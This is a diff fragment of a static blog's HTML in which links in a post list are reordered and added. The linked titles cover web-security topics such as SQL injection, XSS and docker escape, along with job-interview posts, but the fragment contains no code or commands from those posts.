-    <span><a href="/2023/02/21/https%E5%8E%9F%E7%90%86/" title="https+TLS">https+TLS</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
-</div>
-
-    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/12/28/mysql/" title="Mysql">Mysql</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
-</div>
-
-    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
   </li>
 
       
@@ -1509,9 +1250,19 @@ document.querySelector( '.note').innerHTML = text;
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2023/01/20/VXLAN/" title="VXLAN">VXLAN</a></span>
+    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/02/21/https%E5%8E%9F%E7%90%86/" title="https+TLS">https+TLS</a></span>
   </li>
 
       
@@ -1522,6 +1273,46 @@ document.querySelector( '.note').innerHTML = text;
 </div>
 
     <span><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
+</div>
+
+    <span><a href="/2022/12/25/%E5%86%85%E7%BD%91/" title="内网渗透">内网渗透</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
+</div>
+
+    <span><a href="/2022/11/11/reverse/" title="逆向">逆向</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" title="JWT">JWT</a></span>
   </li>
 
       
